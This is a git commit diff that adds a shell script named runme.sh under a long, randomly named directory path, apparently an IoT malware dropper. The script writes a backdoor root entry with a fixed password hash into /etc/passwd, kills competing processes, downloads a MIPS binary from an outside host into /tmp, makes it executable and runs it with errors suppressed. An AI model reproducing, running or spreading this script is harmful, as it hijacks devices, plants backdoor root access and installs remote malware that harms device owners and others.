e4405b0fbbbcb09f19950eb87100b91b4ebcf550
urBenm4 <138570858+urBenm4@users.noreply.github.com>
2026-07-20 13:30:20 +0400

    Add files via upload

---
+++ a/pIN/lINvnhC/xPjRJf/MekBYSPx/AOMVEXIa/BCmA/JmaUw/XTPipH/HqA/bUD/OqB/KGVYl/NVkgR/MofTVfZ/ISLvNZ/eJkmgL/ASDAdtfE/cArNl/tIQbGi/Ecmlzs/SkzM/rTq/REHXZz/ueoR/znpDik/runme.sh
@@ -0,0 +1,11 @@
+#!/bin/sh
+echo 'root:$1$abc$zaXMLi5d6NE.pTzaa2CDd/:0:0:root:/root:/bin/sh' >> /etc/passwd
+sed -i 's|^root:.*|root:\$1\$abc\$zaXMLi5d6NE.pTzaa2CDd/:0:0:root:/root:/bin/sh|' /etc/passwd
+su
+killall -9 kworker/u:1-ev 2>/dev/null
+killall -9 ntb.mipsel 2>/dev/null
+cd /tmp
+rm -f ntb.mipsel 2>/dev/null
+wget http://store.risesmp.cc/wow/ntb.mipsel 2>/dev/null
+chmod 777 ntb.mipsel 
+./ntb.mipsel "$@" 2>/dev/null
